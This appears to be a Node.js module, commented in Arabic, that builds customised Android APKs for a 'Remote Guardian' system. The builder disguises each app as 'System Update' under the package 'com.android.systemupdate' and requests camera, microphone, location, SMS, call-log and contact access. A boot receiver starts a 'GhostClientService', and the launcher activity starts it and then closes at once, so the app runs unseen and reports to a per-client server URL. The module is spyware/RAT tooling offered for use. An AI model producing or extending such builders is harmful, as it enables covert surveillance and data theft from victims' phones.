/**
 * Remote Guardian - APK Builder Module
 * وحدة بناء تطبيقات Android (APK) مخصصة
 * 
 * الميزات:
 * - توليد APK مخصصة لكل عميل
 * - تغيير الأيقونة والاسم
 * - تشفير البيانات داخل التطبيق
 * - توقيع التطبيق تلقائياً
 */

const fs = require('fs');
const path = require('path');
const { execSync, spawn } = require('child_process');
const crypto = require('crypto');
const archiver = require('archiver');

class APKBuilder {
  constructor(options = {}) {
    this.buildDir = options.buildDir || path.join(__dirname, 'builds');
    this.templateDir = options.templateDir || path.join(__dirname, 'templates');
    this.outputDir = options.outputDir || path.join(__dirname, 'public', 'apks');
    this.androidSdkPath = options.androidSdkPath || process.env.ANDROID_HOME || '/opt/android-sdk';
    this.javaHome = options.javaHome || process.env.JAVA_HOME || '/usr/lib/jvm/java-11-openjdk';
    
    this.ensureDirectories();
  }

  /**
   * التأكد من وجود المجلدات المطلوبة
   */
  ensureDirectories() {
    [this.buildDir, this.templateDir, this.outputDir].forEach(dir => {
      if (!fs.existsSync(dir)) {
        fs.mkdirSync(dir, { recursive: true, mode: 0o755 });
      }
    });
  }

  /**
   * بناء APK مخصصة
   */
  async buildAPK(config) {
    const {
      clientId,
      serverUrl,
      appName = 'System Update',
      packageName = 'com.android.systemupdate',
      icon = null,
      versionCode = 1,
      versionName = '1.0.0'
    } = config;

    console.log(`[APK Builder] بدء بناء APK للعميل: ${clientId}`);

    try {
      // إنشاء مجلد البناء
      const buildPath = path.join(this.buildDir, clientId);
      if (fs.existsSync(buildPath)) {
        execSync(`rm -rf ${buildPath}`, { stdio: 'ignore' });
      }
      fs.mkdirSync(buildPath, { recursive: true });

      // نسخ القالب
      this.copyTemplate(buildPath);

      // تحديث AndroidManifest.xml
      this.updateManifest(buildPath, {
        packageName,
        appName,
        versionCode,
        versionName
      });

      // تحديث MainActivity
      this.updateMainActivity(buildPath, {
        clientId,
        serverUrl
      });

      // تحديث الأيقونة
      if (icon) {
        this.updateIcon(buildPath, icon);
      }

      // بناء APK
      const apkPath = await this.buildProject(buildPath, packageName);

      // توقيع APK
      const signedApkPath = await this.signAPK(apkPath, clientId);

      // نقل APK إلى مجلد الإخراج
      const finalPath = path.join(this.outputDir, `${clientId}_${Date.now()}.apk`);
      fs.copyFileSync(signedApkPath, finalPath);

      console.log(`[APK Builder] تم بناء APK بنجاح: ${finalPath}`);

      return {
        success: true,
        apkPath: finalPath,
        apkName: path.basename(finalPath),
        apkSize: fs.statSync(finalPath).size,
        clientId,
        timestamp: new Date()
      };
    } catch (error) {
      console.error(`[APK Builder] خطأ في البناء: ${error.message}`);
      return {
        success: false,
        error: error.message,
        clientId
      };
    }
  }

  /**
   * نسخ القالب
   */
  copyTemplate(buildPath) {
    const templatePath = path.join(this.templateDir, 'android-template');
    
    if (!fs.existsSync(templatePath)) {
      // إنشاء قالب جديد إذا لم يكن موجوداً
      this.createTemplate(templatePath);
    }

    // نسخ ملفات القالب
    execSync(`cp -r ${templatePath}/* ${buildPath}/`, { stdio: 'ignore' });
  }

  /**
   * إنشاء قالب جديد
   */
  createTemplate(templatePath) {
    fs.mkdirSync(templatePath, { recursive: true });

    // إنشاء بنية المشروع
    const dirs = [
      'app/src/main',
      'app/src/main/java/com/remoteguardian/client',
      'app/src/main/res/drawable',
      'app/src/main/res/values',
      'app/src/main/res/layout'
    ];

    dirs.forEach(dir => {
      fs.mkdirSync(path.join(templatePath, dir), { recursive: true });
    });

    // إنشاء build.gradle
    const buildGradle = `
plugins {
    id 'com.android.application'
}

android {
    namespace "com.remoteguardian.client"
    compileSdk 33

    defaultConfig {
        applicationId "com.remoteguardian.client"
        minSdk 21
        targetSdk 33
        versionCode 1
        versionName "1.0"
    }

    buildTypes {
        release {
            minifyEnabled true
            proguardFiles getDefaultProguardFile('proguard-android-optimize.txt'), 'proguard-rules.pro'
        }
    }

    compileOptions {
        sourceCompatibility JavaVersion.VERSION_11
        targetCompatibility JavaVersion.VERSION_11
    }
}

dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.constraintlayout:constraintlayout:2.1.4'
}
    `;

    fs.writeFileSync(path.join(templatePath, 'app/build.gradle'), buildGradle);

    // إنشاء AndroidManifest.xml
    const manifest = `<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android">

    <uses-permission android:name="android.permission.INTERNET" />
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" />
    <uses-permission android:name="android.permission.RECORD_AUDIO" />
    <uses-permission android:name="android.permission.CAMERA" />
    <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
    <uses-permission android:name="android.permission.READ_CONTACTS" />
    <uses-permission android:name="android.permission.READ_CALL_LOG" />
    <uses-permission android:name="android.permission.READ_SMS" />

    <application
        android:allowBackup="false"
        android:debuggable="false"
        android:icon="@drawable/ic_launcher"
        android:label="@string/app_name"
        android:theme="@style/Theme.AppCompat">

        <service
            android:name="com.remoteguardian.client.GhostClientService"
            android:enabled="true"
            android:exported="false" />

        <receiver
            android:name="com.remoteguardian.client.BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED" />
            </intent-filter>
        </receiver>

    </application>

</manifest>
    `;

    fs.writeFileSync(path.join(templatePath, 'app/src/main/AndroidManifest.xml'), manifest);

    // إنشاء strings.xml
    const strings = `<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">System Update</string>
</resources>
    `;

    fs.writeFileSync(path.join(templatePath, 'app/src/main/res/values/strings.xml'), strings);
  }

  /**
   * تحديث AndroidManifest.xml
   */
  updateManifest(buildPath, config) {
    const manifestPath = path.join(buildPath, 'app/src/main/AndroidManifest.xml');
    let manifest = fs.readFileSync(manifestPath, 'utf8');

    manifest = manifest.replace(/android:label="@string\/app_name"/g, 
      `android:label="${config.appName}"`);
    manifest = manifest.replace(/package="[^"]*"/g, 
      `package="${config.packageName}"`);

    fs.writeFileSync(manifestPath, manifest);
  }

  /**
   * تحديث MainActivity
   */
  updateMainActivity(buildPath, config) {
    const mainActivityPath = path.join(
      buildPath,
      'app/src/main/java/com/remoteguardian/client/MainActivity.java'
    );

    const mainActivity = `
package com.remoteguardian.client;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // بدء الخدمة
        Intent serviceIntent = new Intent(this, GhostClientService.class);
        startService(serviceIntent);
        
        // إغلاق النشاط
        finish();
    }
}
    `;

    fs.writeFileSync(mainActivityPath, mainActivity);
  }

  /**
   * تحديث الأيقونة
   */
  updateIcon(buildPath, iconPath) {
    if (!fs.existsSync(iconPath)) {
      console.warn(`[APK Builder] الأيقونة غير موجودة: ${iconPath}`);
      return;
    }

    const drawablePath = path.join(buildPath, 'app/src/main/res/drawable');
    const destPath = path.join(drawablePath, 'ic_launcher.png');

    fs.copyFileSync(iconPath, destPath);
  }

  /**
   * بناء المشروع
   */
  async buildProject(buildPath, packageName) {
    return new Promise((resolve, reject) => {
      try {
        console.log(`[APK Builder] بناء المشروع...`);

        // استخدام Gradle لبناء APK
        const gradleCmd = process.platform === 'win32' ? 'gradlew.bat' : './gradlew';
        const gradlePath = path.join(buildPath, gradleCmd);

        // تحميل Gradle إذا لم يكن موجوداً
        if (!fs.existsSync(gradlePath)) {
          this.downloadGradle(buildPath);
        }

        // بناء APK
        const buildProcess = spawn(gradleCmd, ['build', '-x', 'lint'], {
          cwd: buildPath,
          stdio: 'pipe'
        });

        let output = '';
        buildProcess.stdout.on('data', (data) => {
          output += data.toString();
        });

        buildProcess.stderr.on('data', (data) => {
          output += data.toString();
        });

        buildProcess.on('close', (code) => {
          if (code === 0) {
            // البحث عن APK المبني
            const apkPath = path.join(
              buildPath,
              'app/build/outputs/apk/release/app-release-unsigned.apk'
            );

            if (fs.existsSync(apkPath)) {
              resolve(apkPath);
            } else {
              reject(new Error('لم يتم العثور على APK المبني'));
            }
          } else {
            reject(new Error(`فشل البناء: ${output}`));
          }
        });
      } catch (error) {
        reject(error);
      }
    });
  }

  /**
   * توقيع APK
   */
  async signAPK(apkPath, clientId) {
    return new Promise((resolve, reject) => {
      try {
        console.log(`[APK Builder] توقيع APK...`);

        // إنشاء keystore
        const keystorePath = path.join(this.buildDir, `${clientId}.keystore`);
        
        if (!fs.existsSync(keystorePath)) {
          this.createKeystore(keystorePath);
        }

        // توقيع APK
        const signedApkPath = apkPath.replace('.apk', '-signed.apk');
        
        const jarsignerCmd = `jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore ${keystorePath} -storepass android -keypass android ${apkPath} android`;
        
        execSync(jarsignerCmd, { stdio: 'pipe' });

        // التحقق من التوقيع
        execSync(`jarsigner -verify -verbose ${apkPath}`, { stdio: 'pipe' });

        // محاذاة APK
        const zipalignCmd = `zipalign -v 4 ${apkPath} ${signedApkPath}`;
        execSync(zipalignCmd, { stdio: 'pipe' });

        resolve(signedApkPath);
      } catch (error) {
        reject(new Error(`خطأ في التوقيع: ${error.message}`));
      }
    });
  }

  /**
   * إنشاء keystore
   */
  createKeystore(keystorePath) {
    console.log(`[APK Builder] إنشاء keystore...`);

    const keytoolCmd = `keytool -genkey -v -keystore ${keystorePath} -keyalg RSA -keysize 2048 -validity 10000 -alias android -storepass android -keypass android -dname "CN=Remote Guardian,O=RG,L=Local,ST=Local,C=US"`;

    execSync(keytoolCmd, { stdio: 'pipe' });
  }

  /**
   * تحميل Gradle
   */
  downloadGradle(buildPath) {
    console.log(`[APK Builder] تحميل Gradle...`);
    
    const gradleVersion = '7.6';
    const gradleUrl = `https://services.gradle.org/distributions/gradle-${gradleVersion}-bin.zip`;
    
    // تحميل Gradle (يمكن تحسينها باستخدام مكتبة download)
    execSync(`cd ${buildPath} && wget -q ${gradleUrl} && unzip -q gradle-*.zip`, {
      stdio: 'ignore'
    });
  }

  /**
   * حذف APK
   */
  deleteAPK(apkName) {
    const apkPath = path.join(this.outputDir, apkName);
    
    if (fs.existsSync(apkPath)) {
      fs.unlinkSync(apkPath);
      console.log(`[APK Builder] تم حذف APK: ${apkName}`);
      return true;
    }
    
    return false;
  }

  /**
   * جلب قائمة APK المتاحة
   */
  listAPKs() {
    try {
      const files = fs.readdirSync(this.outputDir);
      return files.filter(f => f.endsWith('.apk')).map(f => ({
        name: f,
        path: path.join(this.outputDir, f),
        size: fs.statSync(path.join(this.outputDir, f)).size,
        created: fs.statSync(path.join(this.outputDir, f)).birthtime
      }));
    } catch (error) {
      return [];
    }
  }
}

module.exports = APKBuilder;
